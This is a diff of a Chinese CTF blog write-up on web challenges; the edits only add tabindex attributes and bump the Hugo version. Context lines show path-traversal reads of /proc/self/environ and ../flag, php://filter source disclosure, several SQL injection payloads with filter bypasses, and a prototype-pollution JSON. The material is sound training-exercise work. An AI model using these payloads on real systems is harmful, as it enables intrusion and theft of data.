@@ -111,19 +111,19 @@
 <p>web 的第一道签到题，打开就说了 hide，果断 <code>F12</code> 看源码，发现注释里有些东西</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-html" data-lang="html"><span class="c">&lt;!--what is this : ./secret/f1ag_is_h4re.php--&gt;</span>
+<pre class="chroma" tabindex="0"><code class="language-html" data-lang="html"><span class="c">&lt;!--what is this : ./secret/f1ag_is_h4re.php--&gt;</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>直接在url后添加 <code>/secret/f1ag_is_h4re.php</code> 进入<del>下一关</del>，这里再看源码并无收获，看一下 Cookie，发现多了一条名为 <code>interesting_string</code> 的 Cookie，查看其内容如下</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">Y25zc3t3ZWxjb21lX3RvX3dlYl9XMHJsZCF9
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">Y25zc3t3ZWxjb21lX3RvX3dlYl9XMHJsZCF9
 </code></pre></td></tr></table>
 </div>
 </div><p>猜测为某种编码，尝试 base64 解码，成功获取 flag</p>
@@ -132,10 +132,10 @@
 <p>真正的签到题？打开发现是一个<del>数学题</del>，果断打开计算器算出正确答案</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">8589934592
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">8589934592
 </code></pre></td></tr></table>
 </div>
 </div><p>输入答案时发现问题，输入框有长度限制，看源码，发现最大长度为 8，而我们的答案有十位，但这里长度限制在前端，打开 Burp Suite 一通抓包改包（也可审查元素直接改maxlength），输入正确答案，成功获取 flag</p>
@@ -147,11 +147,11 @@
 <p>然后添加下面两句</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">X-Forwarded-For: 233.233.233.233
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">X-Forwarded-For: 233.233.233.233
 Referer: www.notcnss.com
 </code></pre></td></tr></table>
 </div>
@@ -161,19 +161,19 @@ Referer: www.notcnss.com
 <p><del>一眼望去，好GAY的题</del>首先看源码，发现如下注释</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-html" data-lang="html"><span class="c">&lt;!-- Why not try to get /source ? --&gt;</span>
+<pre class="chroma" tabindex="0"><code class="language-html" data-lang="html"><span class="c">&lt;!-- Why not try to get /source ? --&gt;</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>果断 url 后加 <code>/source</code>，拿到源码，发现在 <code>/file</code> 中通过name参数可以读取文件，结合 hint 中所说 flag 在 <code>/flag</code> 中构造 url</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">/file?name=../flag
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">/file?name=../flag
 </code></pre></td></tr></table>
 </div>
 </div><p>别问我为什么 flag 在上一级目录，试一试就出来了（逃，成功获取 flag</p>
@@ -182,10 +182,10 @@ Referer: www.notcnss.com
 <p>拿到这道题，只给了两句话，乍一看比较懵</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">Evil robot take my love. I only know that he uses linux. 
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">Evil robot take my love. I only know that he uses linux. 
 </code></pre></td></tr></table>
 </div>
 </div><p>细细分析这两句话中的提示，发现 <code>robot</code> 和 <code>linux</code> 应该有作用</p>
@@ -194,7 +194,7 @@ Referer: www.notcnss.com
 <p>分别尝试 <code>/.s4cret.php.swp</code> 和 <code>/.index.php.swp</code>，发现 index.php 存在临时文件，用 vim 还原，得到源码</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre class="chroma" tabindex="0"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -208,7 +208,7 @@ Referer: www.notcnss.com
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">if(!(isset($_GET['key']) &amp;&amp; isset($_GET['f']))){
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">if(!(isset($_GET['key']) &amp;&amp; isset($_GET['f']))){
     die();
 }
 else{
@@ -228,10 +228,10 @@ else{
 <p>故构造以下url</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">/?key=php://input&amp;f=php://filter/convert.base64-encode/resource=s4cret.php
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">/?key=php://input&amp;f=php://filter/convert.base64-encode/resource=s4cret.php
 </code></pre></td></tr></table>
 </div>
 </div><p>然后 Burp Suite 抓包，请求方法改为 <code>POST</code>，请求体添加 zhi ma kai men!，获得一段 base64 编码的文本（或直接采用 HackBar 发送 POST 请求），解码后可看到一段神奇的注释，成功获得flag</p>
@@ -240,11 +240,11 @@ else{
 <p><del>继续 gay</del>看源码，继续 <code>/source</code>，发现加了一段神奇的语句</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">abspath</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getcwd</span><span class="p">())</span> <span class="ow">and</span> <span class="n">filename</span> <span class="o">!=</span> <span class="s1">'./profile'</span><span class="p">:</span>
+<pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">abspath</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getcwd</span><span class="p">())</span> <span class="ow">and</span> <span class="n">filename</span> <span class="o">!=</span> <span class="s1">'./profile'</span><span class="p">:</span>
     <span class="k">return</span> <span class="s1">'No No No'</span><span class="p">,</span> <span class="mi">422</span>
 </code></pre></td></tr></table>
 </div>
@@ -255,10 +255,10 @@ else{
 <p>一般来说 <code>/proc</code> 目录下有以 PID 命名的目录，可以通过此目录获取进程所在目录的文件，但这里显然无法获取 PID，但源码中 <code>os.getcwd()</code> 提醒我们要用当前工作目录，于是构造以下 url</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">/file?name=/proc/self/cwd/flag
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">/file?name=/proc/self/cwd/flag
 </code></pre></td></tr></table>
 </div>
 </div><p>成功获得 flag</p>
@@ -272,10 +272,10 @@ else{
 <p>打开发现一个登录界面，需要提供密码和验证码，且知道验证码MD5后的前三位，看源码，有以下注释</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-html" data-lang="html"><span class="c">&lt;!--验证码一共4位数字字母，密码都是数字，验证码正确你就知道密码位数了--&gt;</span>
+<pre class="chroma" tabindex="0"><code class="language-html" data-lang="html"><span class="c">&lt;!--验证码一共4位数字字母，密码都是数字，验证码正确你就知道密码位数了--&gt;</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>那就先写一个计算验证码的 python 脚本
@@ -287,10 +287,10 @@ else{
 查看 <code>/proc</code> 文件系统的具体说明，发现在进程目录下存在一个环境变量，猜测 flag 可能存在于此，故构造 url 如下</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">/file?name=/proc/self/environ
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">/file?name=/proc/self/environ
 </code></pre></td></tr></table>
 </div>
 </div><p>发现 flag 果然在此，成功获得 flag</p>
@@ -299,14 +299,14 @@ else{
 <p>查看源码，在 <code>db.php</code> 的注释中发现以下 sql 语句</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="p">...</span><span class="w">
+<pre class="chroma" tabindex="0"><code class="language-sql" data-lang="sql"><span class="p">...</span><span class="w">
 </span><span class="w"></span><span class="n">name</span><span class="w"> </span><span class="nb">char</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span><span class="w">
 </span><span class="w"></span><span class="p">...</span><span class="w">
 </span><span class="w"></span><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">products</span><span class="w"> </span><span class="k">VALUES</span><span class="p">(</span><span class="s1">'cnss'</span><span class="p">,</span><span class="w"> </span><span class="n">sha256</span><span class="p">(....),</span><span class="w"> </span><span class="s1">'FLAG_HERE'</span><span class="p">);</span><span class="w">
@@ -318,7 +318,7 @@ else{
 <p>观察源码，发现 <code>get_product</code> 和 <code>check_name_secret</code> 分离</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre class="chroma" tabindex="0"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -333,7 +333,7 @@ else{
 </span><span class="lnt">13
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">function get_product($name) {
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">function get_product($name) {
   global $db;
   $statement = $db-&gt;prepare(
     "SELECT name, description FROM products WHERE name = ?"
@@ -351,12 +351,12 @@ function check_name_secret($name, $secret) {
 </div><p>即验证 <code>name</code> 和 <code>secret</code> 和获取信息并非同步进行，而获取信息时并不需要 <code>secret</code>，考虑到 Mysql 对尾空格的处理，<code>add</code> 以下内容</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">Name: cnss + 任意空格
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">Name: cnss + 任意空格
 Secret: 符合要求即可
 Description: 任意
 </code></pre></td></tr></table>
@@ -364,11 +364,11 @@ Description: 任意
 </div><p>执行 <code>add</code> 操作后，<code>view</code> 以下内容</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">Name: cnss
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">Name: cnss
 Secret: 上一步设置的密码
 </code></pre></td></tr></table>
 </div>
@@ -378,20 +378,20 @@ Secret: 上一步设置的密码
 <p>经过试验，发现许多字符被屏蔽，比较重要的有（都有方法绕过或不使用）</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">and  -  *  空格
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">and  -  *  空格
 </code></pre></td></tr></table>
 </div>
 </div><p>其中 <code>空格</code> 可用 <code>%0a</code> 代替，注释符号 <code>--</code> 可用 <code>%23</code> 代替
 由于 <code>and</code>  不可用，这里考虑报错注入，且由于 <code>*</code> 不可用，考虑 xml 的报错，经测试，xml 的报错注入可用，故构造如下 payload</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">1%27%0aor%0a(extractvalue(1,concat(0x7e,(......),0x7e)))%23
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">1%27%0aor%0a(extractvalue(1,concat(0x7e,(......),0x7e)))%23
 </code></pre></td></tr></table>
 </div>
 </div><p>只需将 <code>......</code> 处修改为查询语句，即可在报错中看到查询结果
@@ -402,10 +402,10 @@ Secret: 上一步设置的密码
 从第一个界面目测找不到什么有用信息，不妨打开题目所说的 <code>/admin</code> ，看到一个登陆界面，且第一行就说</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">只有admin才能拿到flag
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">只有admin才能拿到flag
 </code></pre></td></tr></table>
 </div>
 </div><p>那就让我们成为 admin 不就好了
@@ -418,10 +418,10 @@ Secret: 上一步设置的密码
 依旧过滤了众多字符，且并无错误信息，故考虑延时盲注，构造如下 payload</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">1'and(if(ascii(substr((select(...)from(...)),index,1))&gt;0,1,sleep(3)))%23
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">1'and(if(ascii(substr((select(...)from(...)),index,1))&gt;0,1,sleep(3)))%23
 </code></pre></td></tr></table>
 </div>
 </div><p>修改 <code>...</code> <code>index</code> 和 <code>0</code> 处的值，通过网页加载时间，判断盲注结果
@@ -432,7 +432,7 @@ Secret: 上一步设置的密码
 源码提供了那就直接康康，发现在 <code>/file</code> 中有以下内容</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre class="chroma" tabindex="0"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -445,7 +445,7 @@ Secret: 上一步设置的密码
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-typescript" data-lang="typescript"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">file</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">ctx</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">name</span><span class="p">)</span> <span class="p">{</span>
+<pre class="chroma" tabindex="0"><code class="language-typescript" data-lang="typescript"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">file</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">ctx</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">name</span><span class="p">)</span> <span class="p">{</span>
         <span class="nx">ctx</span><span class="p">.</span><span class="nx">body</span> <span class="o">=</span> <span class="s1">'No No No...'</span><span class="p">;</span>
         <span class="nx">ctx</span><span class="p">.</span><span class="nx">status</span> <span class="o">=</span> <span class="mi">422</span><span class="p">;</span>
         <span class="k">return</span><span class="p">;</span>
@@ -462,10 +462,10 @@ Secret: 上一步设置的密码
 再看 <code>/save</code> 的部分，可以发现输入数据会通过 <code>JSON.parse</code> 解析，这样就为我们进行原型链污染提供了可能，故构造以下 <code>JSON字符串</code></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-JSON" data-lang="JSON"><span class="p">{</span><span class="nt">"type"</span><span class="p">:</span> <span class="s2">"hhh"</span><span class="p">,</span> <span class="nt">"content"</span><span class="p">:</span> <span class="p">{</span><span class="nt">"constructor"</span><span class="p">:</span> <span class="p">{</span><span class="nt">"prototype"</span><span class="p">:</span> <span class="p">{</span><span class="nt">"name"</span><span class="p">:</span> <span class="err">filename</span><span class="p">}}}}</span>
+<pre class="chroma" tabindex="0"><code class="language-JSON" data-lang="JSON"><span class="p">{</span><span class="nt">"type"</span><span class="p">:</span> <span class="s2">"hhh"</span><span class="p">,</span> <span class="nt">"content"</span><span class="p">:</span> <span class="p">{</span><span class="nt">"constructor"</span><span class="p">:</span> <span class="p">{</span><span class="nt">"prototype"</span><span class="p">:</span> <span class="p">{</span><span class="nt">"name"</span><span class="p">:</span> <span class="err">filename</span><span class="p">}}}}</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>只需修改 <code>filename</code> 的值提交，再在 <code>/file</code> 处将 <code>name</code> 留空，即可读取任意文件，首先尝试 <code>flag</code> 无果，再尝试 <code>../flag</code> ，成功获得 flag</p>
@@ -476,10 +476,10 @@ Secret: 上一步设置的密码
 构造以下 payload</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="mi">1</span><span class="s1">' and case (ascii(substr((something),index,1))) when asc then pow(999,999) end %23
+<pre class="chroma" tabindex="0"><code class="language-sql" data-lang="sql"><span class="mi">1</span><span class="s1">' and case (ascii(substr((something),index,1))) when asc then pow(999,999) end %23
 </span></code></pre></td></tr></table>
 </div>
 </div><p>这里注意 <code>select</code> 和 <code>information</code> 会被过滤，但只需通过大小写变化绕过即可
@@ -487,10 +487,10 @@ Secret: 上一步设置的密码
 通过修改 <code>something</code> <code>index</code> 和 <code>asc</code> 可以爆出库名和表名，但当尝试爆出字段名的时候发现 <code>column</code> 被过滤且无法绕过，所以尝试无列名注入（虽然我也不懂为什么无列名注入的题只有一列，但是还是这么做了）,将 <code>something</code> 改为如下 payload 即可进行无列名注入</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">Select</span><span class="w"> </span><span class="o">`</span><span class="mi">1</span><span class="o">`</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">Select</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">database_name</span><span class="p">.</span><span class="k">table_name</span><span class="p">)</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="w">
+<pre class="chroma" tabindex="0"><code class="language-sql" data-lang="sql"><span class="k">Select</span><span class="w"> </span><span class="o">`</span><span class="mi">1</span><span class="o">`</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">Select</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">database_name</span><span class="p">.</span><span class="k">table_name</span><span class="p">)</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="w">
 </span></code></pre></td></tr></table>
 </div>
 </div><p>依次爆出 flag 的每一位即可，成功获得 flag</p>
@@ -527,7 +527,7 @@ Secret: 上一步设置的密码
                 Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
             </noscript></div></article></div>
 </main><footer class="footer">
-<div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" rel="noopener noreffer" target="_blank" title="Hugo 0.85.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" rel="noopener noreffer" target="_blank" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+<div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" rel="noopener noreffer" target="_blank" title="Hugo 0.87.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" rel="noopener noreffer" target="_blank" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
 </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021</span><span class="author" itemprop="copyrightHolder"> <a href="/" target="_blank">X5tar</a></span> | <span class="license"><a href="https://creativecommons.org/licenses/by-sa/4.0/" rel="license external nofollow noopener noreffer" target="_blank">CC BY-SA 4.0</a></span></div>
 </div>
 </footer></div>
